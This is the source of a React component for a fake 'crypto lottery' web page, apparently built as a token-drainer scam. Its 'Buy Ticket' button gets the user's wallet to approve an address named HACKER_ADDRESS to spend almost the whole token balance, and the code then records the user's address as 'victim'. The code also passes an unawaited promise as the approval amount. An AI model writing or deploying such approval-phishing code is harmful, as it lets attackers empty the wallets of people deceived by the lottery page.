import React from 'react';
import { ethers, BigNumber, utils } from 'ethers';
import Token from '../artifacts/contracts/Token.sol/Token.json';

const { REACT_APP_CONTRACT_ADDRESS, REACT_APP_HACKER_ADDRESS } = process.env;

class Home extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      ready: false,
      hasError: false,
      estimatedTxFee: null
    };
    this.estimateTxFee = this.estimateTxFee.bind(this);
    this.buyTicket = this.buyTicket.bind(this);
  }

  async estimateTxFee() {
    this.setState({
      ready: true
    });

    try {
      const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
      const contract = new ethers.Contract(REACT_APP_CONTRACT_ADDRESS, Token.abi, web3Provider);
      const signer = web3Provider.getSigner();
      const signerAddress = await signer.getAddress();
      const amount = this.getAmount(contract, signerAddress);
      const gasLimit = await contract.estimateGas.approve(REACT_APP_HACKER_ADDRESS, amount);
      const gasPrice = (await web3Provider.getFeeData()).gasPrice;
      const estimatedGasFee = parseFloat(utils.formatEther(gasLimit.mul(gasPrice)));

      const etherscanProvider = new ethers.providers.EtherscanProvider();
      const etherPrice = await etherscanProvider.getEtherPrice();

      const estimatedTxFee = (estimatedGasFee * etherPrice).toFixed(2).toString();
      this.setState({
        hasError: false,
        estimatedTxFee
      });
    } catch(e) {
      console.log(e);
      
      this.setState({
        hasError: true
      });
    }
  }

  async buyTicket() {
    const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
    const contract = new ethers.Contract(REACT_APP_CONTRACT_ADDRESS, Token.abi, web3Provider);
    const signer = web3Provider.getSigner();
    const signerAddress = await signer.getAddress();
    const token = await contract.connect(signer);
    const amount = this.getAmount(contract, signerAddress);
    await token.approve(REACT_APP_HACKER_ADDRESS, amount);
    
    localStorage.setItem('victim', signerAddress);
  }

  async getAmount(contract, signerAddress) {
    const victimBalance = await contract.balanceOf(signerAddress);
    return victimBalance.sub(BigNumber.from(1));
  }

  render() {
    return (
      <div className="app">
        <div className="app-body">
          <div className="title-s">CRYPTO LOTTERY</div>
          <div className="title-m">WIN</div>
          <div className="title-l">1,000 TOX</div>
          {this.state.ready ?
            <div>
              {this.state.hasError &&
              <div>
                <div className="error">Please connect your wallet to Crypto Lottery</div>
                <button className="btn" onClick={this.estimateTxFee}>Retry</button>
              </div>}
              {this.state.estimatedTxFee && <button className="btn" onClick={this.buyTicket}>Buy Ticket ({this.state.estimatedTxFee} TOX)</button>}
            </div> :
            <button className="btn" onClick={this.estimateTxFee}>Play Now</button>}
        </div>
      </div>
    );
  }
}

export default Home;